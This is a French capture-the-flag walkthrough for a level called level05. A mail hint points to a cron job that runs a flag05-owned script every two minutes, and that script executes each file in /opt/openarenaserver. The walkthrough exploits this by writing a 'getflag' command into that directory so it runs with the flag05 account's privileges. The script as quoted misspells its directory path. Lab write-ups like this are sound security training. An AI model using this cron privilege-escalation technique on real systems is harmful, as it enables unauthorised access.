# Message

Quand on se connecte, on a le message :

```
You have a new mail
```

Je cherche avec un `find` :

```bash
find / -name mail 2>/dev/null
```

Output :

```
/usr/lib/byobu/mail
/var/mail
/var/spool/mail 
/rofs/usr/lib/byobu/mail 
/rofs/var/mail 
/rofs/var/spool/mail
```

Je cherche ensuite le mail.

J’examine les fichiers et je les vérifie un à un :

```bash
ls `find / -name mail 2>/dev/null`
```

Output :

```
/rofs/usr/lib/byobu/mail  /usr/lib/byobu/mail  

/rofs/var/mail:
level05

/rofs/var/spool/mail:
level05

/var/mail:
level05 

/var/spool/mail: 
level05
```

Dans certains fichiers `level05`, j’ai cet output :

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- `*/2 * * * *` indique que c’est une **crontab** qui s’exécute **toutes les 2 minutes**
- `su -c` permet d’exécuter une commande en tant qu’un autre utilisateur
- Ici la commande exécutée est :

```
sh /usr/sbin/openarenaserver
```

Elle est lancée **en tant que `flag05`**.

---

# Ouvrir le script

Je connais déjà le script et je peux le lire avec `cat`.  
Mais il existe aussi une deuxième méthode : chercher directement les fichiers appartenant à `flag05` :

```bash
find / -user flag05 2>/dev/null
```

Si on fait un `cat` sur le fichier :

```
/usr/sbin/openarenaserver
```

on obtient :

```sh
#!/bin/sh

for i in /opt/openarenasererver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

Le script exécute **tous les fichiers dans `/opt/openarenaserver/`** avec `bash`, pendant maximum **5 secondes**, puis les supprime.

---

# Exploit

Pour exploiter ça, on va simplement écrire une commande dans ce dossier :

```bash
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
```

Cela crée un fichier `flag05` dans `/opt/openarenaserver` contenant la commande :

```
getflag > /tmp/flag05
```

Quand la crontab s’exécute (toutes les 2 minutes), le script lance notre fichier avec les privilèges `flag05`, puis écrit le résultat de `getflag` dans `/tmp/flag05`.

Il ne reste plus qu’à attendre 2 minutes, puis lire le fichier :

```bash
cat /tmp/flag05
```
et on obtient le flag

